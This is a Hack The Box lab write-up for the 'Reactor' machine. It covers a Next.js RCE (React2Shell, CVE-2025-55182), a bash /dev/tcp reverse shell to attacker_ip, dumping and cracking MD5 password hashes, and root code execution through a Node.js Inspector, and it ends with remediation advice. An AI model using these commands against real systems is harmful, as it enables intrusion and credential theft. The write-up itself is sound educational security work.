# HTB Reactor Writeup

## Overview

**Machine:** Reactor
**Platform:** Hack The Box
**Foothold:** React2Shell / CVE-2025-55182 RCE
**Privilege Escalation:** Local Node.js Inspector running as root

## Summary

The target exposed a Next.js application on port `3000`. The application was vulnerable to React2Shell, which allowed remote command execution as the `node` user.

After gaining a reverse shell, I found a SQLite database inside the application directory containing user password hashes. The `engineer` user's hash was cracked using John the Ripper, allowing SSH access to the machine and retrieval of the user flag.

For privilege escalation, local enumeration revealed a Node.js Inspector service listening on `127.0.0.1:9229`. The inspected Node.js process was running as `root`, which allowed command execution in the root process context and access to the root flag.

---

## Reconnaissance

Initial service enumeration showed that the target was running SSH and a Next.js application on port `3000`.

```bash
sudo nmap -Pn -sV -sC -p22,80,3000,6274 target_ip
```

Relevant result:

```text
22/tcp   open   ssh
3000/tcp open   http
X-Powered-By: Next.js
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch
```

The `X-Powered-By: Next.js` header and the RSC-related headers indicated that the service was likely using React Server Components.

The hostname was added to `/etc/hosts`:

```bash
echo "target_ip reactor.htb" | sudo tee -a /etc/hosts
```

---

## Initial Access

The application was tested using a React2Shell exploit.

```bash
python3 react2shell.py http://reactor.htb:3000 id
```

The server returned an HTTP `500`, but the response contained command output:

```text
500
0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
1:E{"digest":"uid=999(node) gid=988(node) groups=988(node)"}
```

This confirmed remote command execution as the `node` user.

---

## Reverse Shell

A listener was started on the attacking machine:

```bash
nc -lvnp 4444
```

The reverse shell payload was base64-encoded to avoid quoting issues:

```bash
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' | base64 -w0
```

Example encoded payload:

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcl9pcC80NDQ0IDA+JjE=
```

The encoded payload was executed through the RCE:

```bash
python3 cve_2025_55182.py -u http://target_ip:3000 -c 'echo BASE64_PAYLOAD_HERE | base64 -d | bash'
```

A shell was received as the `node` user:

```text
node@reactor:/opt/reactor-app$
```

---

## Post-Exploitation Enumeration

Inside `/opt/reactor-app`, a SQLite database was discovered:

```bash
ls -la
```

The database file was named:

```text
reactor.db
```

The `users` table was queried:

```bash
sqlite3 reactor.db "SELECT * FROM users;"
```

Output:

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

The hashes appeared to be raw MD5 hashes.

---

## Credential Cracking

The hashes were saved locally in `hashes.txt`:

```text
admin:a203b22191d744a4e70ada5c101b17b8
engineer:39d97110eafe2a9a68639812cd271e8e
```

John the Ripper was used with the `Raw-MD5` format:

```bash
john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt
```

John successfully cracked the `engineer` password:

```text
reactor1         (engineer)
```

Credentials obtained:

```text
engineer:reactor1
```

---

## SSH Access

The cracked credentials were used to access the machine over SSH:

```bash
ssh engineer@target_ip
```

After logging in as `engineer`, the user flag was found in the home directory:

```bash
ls
cat user.txt
```

User flag:

```text
[REDACTED]
```

---

## Privilege Escalation

Local port enumeration revealed a service listening on `127.0.0.1:9229`:

```bash
ss -lntp
```

Relevant output:

```text
LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*
LISTEN 71 511 *:3000 *:*
```

Process enumeration showed that port `9229` was a Node.js Inspector instance running as `root`:

```bash
ps auxww | grep -E "node|next|inspect|9229|reactor" | grep -v grep
```

Output:

```text
node  1389  ... next-server (v15.0.3)
root  1391  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

This was highly sensitive because the Node.js Inspector allows debugging and code execution inside the running Node.js process. Since the process was running as `root`, code executed through the inspector would also run as `root`.

The inspector endpoints were queried:

```bash
curl -s http://127.0.0.1:9229/json/version
curl -s http://127.0.0.1:9229/json/list
```

Output:

```json
{
  "Browser": "node.js/v20.20.2",
  "Protocol-Version": "1.1"
}
[
  {
    "description": "node.js instance",
    "title": "/opt/uptime-monitor/worker.js",
    "type": "node",
    "url": "file:///opt/uptime-monitor/worker.js",
    "webSocketDebuggerUrl": "ws://127.0.0.1:9229/96a6c426-9d08-4b1b-a8b7-dc7b793c7019"
  }
]
```

The Node Inspector was accessed locally:

```bash
node inspect 127.0.0.1:9229
```

Inside the debugger, command execution was confirmed:

```text
debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
```

Output:

```text
'uid=0(root) gid=0(root) groups=0(root)\n'
```

The root flag was then read:

```text
debug> exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

Root flag:

```text
[REDACTED]
```

---

## Attack Path

```text
Next.js App on Port 3000
        ↓
React2Shell / CVE-2025-55182 RCE
        ↓
Shell as node
        ↓
SQLite database disclosure
        ↓
MD5 hash cracking
        ↓
SSH as engineer
        ↓
Local Node.js Inspector on 127.0.0.1:9229
        ↓
Inspector attached to root-owned Node.js process
        ↓
Root command execution
```

---

## Key Findings

| Finding                                               | Impact                             |
| ----------------------------------------------------- | ---------------------------------- |
| React2Shell RCE in Next.js application                | Remote command execution as `node` |
| SQLite database accessible from application directory | Disclosure of user password hashes |
| Weak MD5 password hashing                             | Offline password cracking          |
| Reused/cracked credentials for SSH                    | Shell access as `engineer`         |
| Node.js Inspector exposed locally as root             | Local privilege escalation to root |

---

## Remediation

Recommended fixes:

1. **Patch React / Next.js dependencies**

   * Update vulnerable React Server Components and Next.js packages.
   * Ensure dependencies are pinned to patched versions.

2. **Disable Node.js Inspector in production**

   * Never run production Node.js processes with `--inspect`.
   * If debugging is required, restrict access and avoid running debug processes as root.

3. **Avoid running application services as root**

   * Run background workers and application processes under least-privileged service accounts.

4. **Secure credential storage**

   * Do not use raw MD5 for password hashing.
   * Use modern password hashing algorithms such as Argon2id, bcrypt, or scrypt.

5. **Restrict sensitive files**

   * Application databases and configuration files should have strict filesystem permissions.
   * Avoid storing credential material in world-readable application directories.

---

## Lessons Learned

This machine demonstrated how a web RCE can lead to full system compromise when combined with weak credential storage and insecure debugging configurations.

The most critical issue was the root-owned Node.js Inspector service. Even though it was bound to localhost, any local user with shell access could attach to it and execute code as root.

Production systems should never expose debug interfaces, especially from privileged processes.
